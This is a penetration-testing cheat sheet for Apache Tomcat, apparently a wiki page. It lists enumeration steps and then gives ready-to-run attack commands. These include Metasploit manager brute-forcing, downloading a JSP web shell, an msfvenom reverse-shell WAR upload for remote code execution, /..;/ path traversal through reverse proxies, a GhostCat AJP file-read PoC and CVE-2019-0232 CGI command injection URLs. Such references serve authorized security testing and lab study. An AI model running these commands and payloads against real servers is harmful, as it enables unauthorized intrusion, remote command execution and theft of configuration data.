# Tomcat

## **Introduction**

The following schema represents a general folder structure of a Tomcat installation

```
├── bin ----------------------> The bin folder stores scripts and binaries needed to start and run a Tomcat server. 
├── conf ---------------------> The conf folder stores various configuration files used by Tomcat.
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml -----> Stores user credentials and roles. Allows/disallows access to /manager and /host-manager admin pages
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib ----------------------> The lib folder holds the various JAR files needed for the correct functioning of Tomcat.
├── logs ---------------------> The logs and temp folders store temporary log files
├── temp ---------------------> The logs and temp folders store temporary log files
├── webapps ------------------> The webapps folder is the default webroot of Tomcat and hosts all the applications.
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
|   ├── jsp
|   |   └── admin.jsp
|   └── web.xml --------------> Contains sensitive information. Stores information about the mechanisms underlying the application
|   └── lib
|   |    └── jdbc_drivers.jar
|   └── classes --------------> All compiled classes used by the application
|      └── AdminServlet.class  
|
└── work ---------------------> The work folder acts as a cache and is used to store data during runtime.
    └── Catalina
        └── localhost
```

***

## **Footprinting & Enumeration**

| Command                                                                                                                                                                                                                          | Description                                                      |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| <p>Browse to<br><em>http://test.example:8080/invalid</em></p>                                                                                                                                                                    | Requesting an invalid page should reveal the server and version  |
| _curl -s http://test.example:8080/docs/ \| grep Tomcat_                                                                                                                                                                          | Read the default documentation page and check the Tomcat version |
| Browse to _http://test.example:8080/manager_                                                                                                                                                                                     | Check if the `manager` (admin-only) page exists                  |
| <p>Browse to<br><em>http://test.example:8080/host-manager</em></p>                                                                                                                                                               | Check if the `host-manager` (admin-only) page exists             |
| [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)                                                                                                                           | Useful tool to quickly scan Tomcat instances                     |
| [https://raw.githubusercontent.com/nixawk/fuzzdb/refs/heads/master/discovery/applications/ApacheTomcat.fuzz.txt](https://raw.githubusercontent.com/nixawk/fuzzdb/refs/heads/master/discovery/applications/ApacheTomcat.fuzz.txt) | Useful wordlist to fuzz Tomcat instances                         |

***

## **Tomcat Manager Attacks**

> Having access to the `/manager` or `/host-manager` admin pages can help achieve `RCE` on the Tomcat server

1. **Login Bruteforcing:**
   * To attempt login bruteforcing, se the `auxiliary/scanner/http/tomcat_mgr_login` **Metasploit module**
   * Note: in case of errors, you might need to `set PROXIES http://127.0.0.1:8080` and **edit the requests** sent by the module with **BurpSuite**
2. **Tomcat Manager WAR File Upload to RCE**
   * Prerequisites: credentials of a user with the `manager-gui` role
   * **\[Automatically] - Metasploit:** `multi/http/tomcat_mgr_upload`
   * **\[Manually]** - Download JSP Web Shell: `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`
   * Add the web shell to a WAR archive: `zip -r backup.war cmd.jsp`
   * **\[Alternative Payload]:** `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your-ip> LPORT=<your-nc-port> -f war > backup.war`
   * Navigate to `/manager/html` and **upload the previous WAR file containing the JSP WEB Shell**
   * Get RCE: `curl http://test.example:8080/backup/cmd.jsp?cmd=id`

***

## **Path Traversal via misconfigured Reverse Proxy**

In some vulnerable configurations of Tomcat you can gain access to protected directories in Tomcat using the path: `/..;/` or `/;param=value/`

{% hint style="info" %}
Tomcat will threat the sequence **`/..;/`** as **`/../`** and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.\
This allows an attacker to access Apache Tomcat resources that are not normally accessible via the reverse proxy mapping.



You can read more about this misconfiguration [**here**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)
{% endhint %}

For example, you might be able to access the Tomcat manager page by navigating to&#x20;

`www.example.com/blabla/..;/manager/html`

Another way to bypass protected paths using this trick is to access

`www.example.com/;param=value/manager/html`

{% hint style="danger" %}
**Notice that this misconfiguration might not always give you access to the Tomcat manager, as it was patched to only allow the same host to access it, as explained by the error message below:**

_By default the Host Manager is only accessible from a browser running on the same machine as Tomcat. If you wish to modify this restriction, you'll need to edit the Host Manager's context.xml file._&#x20;
{% endhint %}

***

## **Unauthenticated LFI - GhostCat**

> * Only works if the `port 8009` is running the `AJP` service
> * Only allows to read files and folders within the `webapps` folder

**Follow these steps:**

1. Use [https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
2. PoC: `python2.7 tomcat-ajp.lfi.py test.example -p 8009 -f WEB-INF/web.xml`

***

## **Attacking Tomcat-CGI \[Windows]**

> 1. What is a CGI Servlet?
>    * A CGI Servlet is a program that runs on a web server to support the execution of external applications that conform to the CGI specification.
>    * It is a middleware between web servers and external information resources like databases
> 2. How does CVE-2019-0232 work?
>    * CVE-2019-0232 is a critical security issue that could result in remote code execution.
>    * Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected.
>    * This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled.
>    * An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, allowing to execute arbitrary commands on the affected system.

**Follow these steps:**

* Find any `.cmd` or `.bat` file inside the `cgi directory` by `extension fuzzing`
* Fuzzing `.cmd`: `ffuf -w /usr/share/dirb/wordlists/common.txt -u http://test.example:8080/cgi/FUZZ.cmd`
* Fuzzing `.bat`: `ffuf -w /usr/share/dirb/wordlists/common.txt -u http://test.example:8080/cgi/FUZZ.bat`
* After finding one such file, append `&command` to gain RCE (example: welcome.bat)
* `http://test.example:8080/cgi/welcome.bat?&dir`
* `Troubleshooting`: specify the `absolute path to the command`, or alternatively you might need to use `URL Encoding`
